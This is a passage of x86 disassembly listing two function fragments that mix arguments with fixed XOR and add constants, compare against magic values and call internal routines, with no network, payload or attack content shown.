  4290e6:	push   DWORD PTR [esp+0xc]
  4290ea:	xor    eax,edi
  4290ec:	add    eax,esi
  4290ee:	mov    DWORD PTR [esp+0x20],eax
  4290f2:	lea    eax,[esp+0x20]
  4290f6:	push   eax
  4290f7:	push   ebx
  4290f8:	push   DWORD PTR [esp+0x20]
  4290fc:	push   DWORD PTR [esp+0x28]
  429100:	push   DWORD PTR [esp+0x24]
  429104:	call   0x428ac9
  429109:	mov    eax,DWORD PTR [esp+0x10]
  42910d:	mov    ecx,DWORD PTR [ebx]
  42910f:	xor    eax,edi
  429111:	add    eax,esi
  429113:	cmp    ecx,eax
  429115:	je     0x429173
  429117:	mov    eax,DWORD PTR [esp+0x18]
  42911b:	mov    ecx,DWORD PTR [esp+0x14]
  42911f:	xor    eax,edi
  429121:	add    eax,esi
  429123:	imul   eax,DWORD PTR [esp+0x1c]
  429128:	mov    DWORD PTR [ecx],eax
  42912a:	jmp    0x429173
  42912c:	mov    ecx,DWORD PTR [ebp+0x20]
  42912f:	cmp    ecx,0xf89c85a1
  429135:	jne    0x42913e
  429137:	push   0xf89c85be
  42913c:	jmp    0x42915c
  42913e:	mov    ecx,DWORD PTR [ebp+0x20]
  429141:	cmp    ecx,0xf89c85be
  429147:	jne    0x429150
  429149:	push   0xf89c85bf
  42914e:	jmp    0x42915c
  429150:	mov    ecx,DWORD PTR [ebp+0x20]
  429153:	cmp    ecx,0xf89c85bf
  429159:	jne    0x429173
  42915b:	push   eax
  42915c:	push   DWORD PTR [ebp+0x1c]
  42915f:	push   DWORD PTR [ebp+0x18]
  429162:	push   ebx
  429163:	push   DWORD PTR [ebp+0x10]
  429166:	push   DWORD PTR [ebp+0xc]
  429169:	push   DWORD PTR [ebp+0x8]
  42916c:	call   0x429007
  429171:	mov    DWORD PTR [ebx],eax
  429173:	mov    eax,DWORD PTR [ebx]
  429175:	pop    edi
  429176:	pop    esi
  429177:	pop    ebx
  429178:	mov    esp,ebp
  42917a:	pop    ebp
  42917b:	ret    0x1c
  42917e:	push   ebp
  42917f:	mov    ebp,esp
  429181:	sub    esp,0xc
  429184:	mov    eax,0xf89c85a5
  429189:	mov    DWORD PTR [ebp-0x8],eax
  42918c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429193:	mov    ecx,DWORD PTR [ebp-0x8]
  429196:	xor    ecx,0x75108ae
  42919c:	add    ecx,0x3272f5
  4291a2:	mov    DWORD PTR [ebp-0x4],ecx
  4291a5:	mov    ecx,DWORD PTR [ebp+0xc]
  4291a8:	push   eax
  4291a9:	mov    DWORD PTR [ebp+0xc],ecx
  4291ac:	push   DWORD PTR [ebp+0xc]
  4291af:	lea    eax,[ebp-0x4]
  4291b2:	push   DWORD PTR [ebp+0x8]
  4291b5:	push   eax
  4291b6:	push   DWORD PTR [ebp+0xc]
  4291b9:	push   DWORD PTR [ebp-0xc]
  4291bc:	push   DWORD PTR [ebp-0x8]
  4291bf:	call   0x429007
  4291c4:	mov    DWORD PTR [ebp-0x4],eax
  4291c7:	mov    eax,DWORD PTR [ebp-0x4]
  4291ca:	leave  
  4291cb:	ret    0x8
